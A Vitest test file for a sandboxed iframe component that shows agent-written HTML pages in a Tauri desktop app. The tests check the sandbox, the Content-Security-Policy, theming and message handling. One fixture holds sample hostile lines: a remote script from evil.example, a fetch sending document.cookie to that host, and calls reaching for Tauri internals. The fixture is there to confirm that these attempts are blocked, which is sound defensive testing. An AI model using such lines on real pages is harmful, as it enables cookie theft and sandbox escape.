import { act, cleanup, render, screen } from "@testing-library/react";
import { afterEach, beforeEach, expect, test, vi } from "vitest";

import { InlinePage, PAGE_POLICY, pageDocument } from "./InlinePage";
import { setAppearance, tokensInDocument } from "./tokensInDocument";

let removeTokens = () => {};

beforeEach(() => {
  removeTokens = tokensInDocument();
});

afterEach(() => {
  cleanup();
  removeTokens();
  vi.restoreAllMocks();
});

const CHART = '<svg viewBox="0 0 10 10"><rect width="4" height="8" fill="var(--chart-1)" /></svg>';

// A page that tries each way out: the Tauri API, a request, and code and an image from a server.
const HOSTILE = [
  '<script src="https://evil.example/steal.js"></script>',
  '<img src="https://evil.example/pixel.png">',
  "<script>",
  "window.__TAURI__.core.invoke('list_worktrees');",
  "parent.__TAURI_INTERNALS__.invoke('list_worktrees');",
  "fetch('https://evil.example/?' + document.cookie);",
  "</script>",
].join("\n");

function frame() {
  return screen.getByTitle<HTMLIFrameElement>("Build workflow");
}

/** A message from `source`, as a frame's `postMessage` to the window delivers it. */
function messageFrom(source: Window | null, data: unknown) {
  act(() => {
    window.dispatchEvent(new MessageEvent("message", { data, source }));
  });
}

/** Every message the window sent the frame from now on. */
function sentToFrame() {
  const sent: { type: string; document?: string; css?: string }[] = [];
  vi.spyOn(frame().contentWindow!, "postMessage").mockImplementation((message: unknown) => {
    sent.push(message as (typeof sent)[number]);
  });
  return sent;
}

/** What a policy allows `directive` to load from, by its own directive or the default. */
function sourcesOf(policy: string, directive: string): string[] {
  const directives = new Map(
    policy.split(";").map((part) => {
      const [name, ...sources] = part.trim().split(/\s+/);
      return [name, sources] as const;
    }),
  );
  return directives.get(directive) ?? directives.get("default-src") ?? [];
}

/** The policy `document` declares before anything else in it. */
function policyOf(document: string): string {
  const parsed = new DOMParser().parseFromString(document, "text/html");
  const first = parsed.head.querySelector("meta[http-equiv]")!;
  // Nothing that loads or runs comes before the policy.
  expect(first.previousElementSibling?.getAttribute("charset")).toBe("utf-8");
  expect(first.previousElementSibling?.previousElementSibling).toBeNull();
  expect(first.getAttribute("http-equiv")).toBe("Content-Security-Policy");
  return first.getAttribute("content")!;
}

test("a page shows under its title in a frame that only runs scripts", () => {
  render(<InlinePage title="Build workflow" html={CHART} height={null} frame={null} />);

  expect(screen.getByRole("group", { name: "Page: Build workflow" })).toBeTruthy();
  expect(screen.getByText("Build workflow")).toBeTruthy();
  // No allow-same-origin: the page's origin is its own, so it reaches no storage and no window.
  expect(frame().getAttribute("sandbox")).toBe("allow-scripts");
  expect(frame().srcdoc).toContain(CHART);
  expect(policyOf(frame().srcdoc)).toBe(PAGE_POLICY);
});

test("the page's policy loads nothing from the network", () => {
  // A request, a script, an image, a style, a font, a frame, a form: none may name a host.
  const kinds = ["connect-src", "script-src", "img-src", "style-src", "font-src", "media-src", "frame-src", "object-src", "worker-src"];
  for (const kind of kinds) {
    for (const source of sourcesOf(PAGE_POLICY, kind)) {
      expect(["'none'", "'unsafe-inline'", "data:", "blob:"], `${kind} ${source}`).toContain(source);
    }
  }
  expect(sourcesOf(PAGE_POLICY, "connect-src")).toEqual(["'none'"]);
  expect(sourcesOf(PAGE_POLICY, "script-src")).toEqual(["'unsafe-inline'"]);
  expect(sourcesOf(PAGE_POLICY, "form-action")).toEqual(["'none'"]);
  expect(sourcesOf(PAGE_POLICY, "base-uri")).toEqual(["'none'"]);
});

test("a page that reaches for Tauri, fetch or a remote script gets the same closed frame", () => {
  render(<InlinePage title="Build workflow" html={HOSTILE} height={null} frame={null} />);

  // The page's own tags stay as the agent wrote them: the policy and the sandbox stop them, not
  // a rewrite. `crates/grove-core/tests/inline_page_frame.rs` runs such a page in a browser.
  expect(frame().srcdoc).toContain(HOSTILE);
  expect(policyOf(frame().srcdoc)).toBe(PAGE_POLICY);
  expect(frame().getAttribute("sandbox")).toBe("allow-scripts");
  // The window gives the frame nothing but the page: no Tauri object goes in with it.
  expect(frame().srcdoc.replace(HOSTILE, "")).not.toMatch(/__TAURI/);
});

test("a page gets grove's theme as CSS variables", () => {
  render(<InlinePage title="Build workflow" html={CHART} height={null} frame={null} />);

  const theme = new DOMParser().parseFromString(frame().srcdoc, "text/html").getElementById("grove-theme")!;
  for (const [variable, value] of [
    ["background", "#161616"],
    ["foreground", "#f5f5f5"],
    ["muted", "#a1a1a1"],
    // jsdom gives a token's value with no spaces after its commas.
    ["border", "rgba(255,255,255,0.08)"],
    ["accent", "#346bf1"],
    ["chart-1", "#51a2ff"],
    ["chart-2", "#00d492"],
    ["chart-3", "#ffb900"],
    ["chart-4", "#a3b3ff"],
    ["chart-5", "#ff6467"],
    ["chart-6", "#e08a62"],
    ["radius", "6px"],
  ]) {
    expect(theme.textContent).toContain(`--${variable}:${value};`);
  }
  expect(theme.textContent).toMatch(/--font-sans:-apple-system,/);
  expect(theme.textContent).toMatch(/--font-mono:ui-monospace,/);
  expect(theme.textContent).toContain("color-scheme:dark;");
});

test("a theme switch re-themes a page already shown, without loading it again", async () => {
  render(<InlinePage title="Build workflow" html={CHART} height={null} frame={null} />);
  const shown = frame().srcdoc;
  const sent = sentToFrame();

  await act(async () => setAppearance("light", "default"));

  expect(sent).toHaveLength(1);
  expect(sent[0].type).toBe("grove-page-theme");
  expect(sent[0].css).toContain("--background:#ffffff;");
  expect(sent[0].css).toContain("--foreground:#18181b;");
  expect(sent[0].css).toContain("color-scheme:light;");
  expect(frame().srcdoc).toBe(shown);
});

test("the page itself swaps its theme when the window sends a new one", () => {
  const script = new DOMParser()
    .parseFromString(pageDocument(CHART, ":root{--background:#161616;}"), "text/html")
    .querySelector("script")!.textContent;

  // The reporter listens for the theme only from the window that holds the frame.
  expect(script).toContain('e.source!==parent');
  expect(script).toContain('"grove-page-theme"');
  expect(script).toContain('getElementById("grove-theme")');
});

test("where the app serves the frame, the page is sent to it when the frame says it is ready", () => {
  render(<InlinePage title="Build workflow" html={CHART} height={null} frame="grove-page://localhost/" />);
  const sent = sentToFrame();

  expect(frame().getAttribute("src")).toBe("grove-page://localhost/");
  expect(frame().hasAttribute("srcdoc")).toBe(false);
  expect(frame().getAttribute("sandbox")).toBe("allow-scripts");
  expect(sent).toHaveLength(0);

  messageFrom(frame().contentWindow, { type: "grove-page-ready" });

  expect(sent).toHaveLength(1);
  expect(sent[0].type).toBe("grove-page");
  expect(sent[0].document).toContain(CHART);
  expect(policyOf(sent[0].document!)).toBe(PAGE_POLICY);
  expect(sent[0].document).toContain("--background:#161616;");
});

test("a ready message from any other window sends no page", () => {
  render(<InlinePage title="Build workflow" html={CHART} height={null} frame="grove-page://localhost/" />);
  const sent = sentToFrame();

  messageFrom(window, { type: "grove-page-ready" });
  messageFrom(null, { type: "grove-page-ready" });

  expect(sent).toHaveLength(0);
});

test("the frame is as tall as the page says, up to 2000 pixels", () => {
  render(<InlinePage title="Build workflow" html={CHART} height={null} frame={null} />);

  messageFrom(frame().contentWindow, { type: "grove-page-height", height: 412 });
  expect(frame().style.height).toBe("412px");

  messageFrom(frame().contentWindow, { type: "grove-page-height", height: 9000 });
  expect(frame().style.height).toBe("2000px");

  // Only its own page sizes it, and only with a real height.
  messageFrom(window, { type: "grove-page-height", height: 100 });
  messageFrom(frame().contentWindow, { type: "grove-page-height", height: "100%" });
  messageFrom(frame().contentWindow, { type: "grove-page-height", height: Number.NaN });
  messageFrom(frame().contentWindow, { type: "grove-page-height", height: -5 });
  messageFrom(frame().contentWindow, null);
  expect(frame().style.height).toBe("2000px");
});

test("a page shown with a height keeps it, whatever the page says", () => {
  render(<InlinePage title="Build workflow" html={CHART} height={320} frame={null} />);

  expect(frame().style.height).toBe("320px");

  messageFrom(frame().contentWindow, { type: "grove-page-height", height: 900 });

  expect(frame().style.height).toBe("320px");
});
